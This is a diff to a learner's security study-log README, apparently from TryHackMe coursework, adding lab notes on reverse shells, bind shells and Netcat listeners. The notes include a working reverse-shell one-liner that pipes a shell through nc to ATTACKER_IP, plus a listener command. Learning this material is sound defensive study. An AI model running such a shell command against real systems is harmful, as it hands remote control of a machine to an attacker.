@@ -589,7 +589,8 @@ Defending a system requires thinking like a designer and an architect, using fou
 | **SQL Fundamentals** | 🗄️ Database Security  | Database Types, Structural Elements, & Relational Keys | |  ✅ Completed |
 | **Burp Suite Basics** | 🛠️ Security Tools | Intercepting Proxies, Tool Architecture, & Traffic Auditing |  ✅ Completed |
 | **Hydra** | 🛠️ Security Tools | Online Password Attacks, Wordlists, & Protocol Brute-forcing |   ✅ Completed  |
-| **Gobuster Basics** | 🛠️ Security Tools | Directory Busting, DNS Subdomain Hunting, & Status Codes |  🟡 In Progress 
+| **Gobuster Basics** | 🛠️ Security Tools | Directory Busting, DNS Subdomain Hunting, & Status Codes |  ✅ Completed |
+| **Shells Overview** | Infrastructure Security | Reverse/Bind Shells, Netcat/Socat Listeners, & Web Shell Uploads | 🟡 In Progress |
 ---
 
 ### 🔍 Technical Evidence & Writeups
@@ -1420,6 +1421,36 @@ gobuster vhost -u http://TARGET_IP -w /usr/share/wordlists/SecLists/Discovery/DN
 *   **`-u`:** Points to the base URL or target server IP hosting the services [1.1].
 
 ---
+---
+---
+---
+---
+
+## Lab: Shells Overview & Access Control (TryHackMe - Cyber101)
+
+## 🖥️ Shell Overview
+A shell is the command-line interface that allows a user or an attacker to interact directly with a system's operating system. In security auditing, obtaining a remote shell on a target system is the ultimate goal of exploitation, enabling the auditor to execute commands, run tools, and traverse directories.
+*   **Interactivity Factor:** Shells are categorized as non-interactive (only returning a single command output without user prompt inputs) or fully interactive (acting like a normal terminal with tab completion and text input prompts).
+
+## 🔄 Reverse Shell
+A reverse shell occurs when the compromised target system actively initiates an outbound network connection back to a listening machine controlled by the attacker.
+*   **Security Advantage:** This is the baseline standard for penetration testers because network firewalls almost always trust outbound user traffic (like browsing or updates), allowing the shell to slide right out of the corporate network.
+*   **Linux Execution Payloads:** 
+    `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+
+## 🖧 Bind Shell
+A bind shell is the exact opposite of a reverse shell. The target system opens a specific communication port and binds a system terminal to it, waiting for the attacker to connect inward.
+*   **Security Obstacle:** Bind shells are rarely successful against modern environments because perimeter network firewalls strictly block unexpected incoming connection requests from untrusted external IPs.
+
+## 🎧 Shell Listener
+A shell listener is a utility configured on the attacker's machine to keep a specific port open, waiting to capture incoming data streams or reverse shell connections triggered on a target.
+*   **Standard Implementation:** The most common tool used to spin up a shell listener is Netcat.
+*   **Execution Command:** 
+    `attacker@kali:~$ nc -lvnp 443`
+    *   `-l`: Binds Netcat to **Listen** mode.
+    *   `-v`: Enables **Verbose** tracking to output logs when a host hits the port.
+    *   `-n`: Disables DNS resolution to speed up connections.
+    *   `-p 443`: Specifies the exact local incoming port to monitor.
 
 ---
 ---
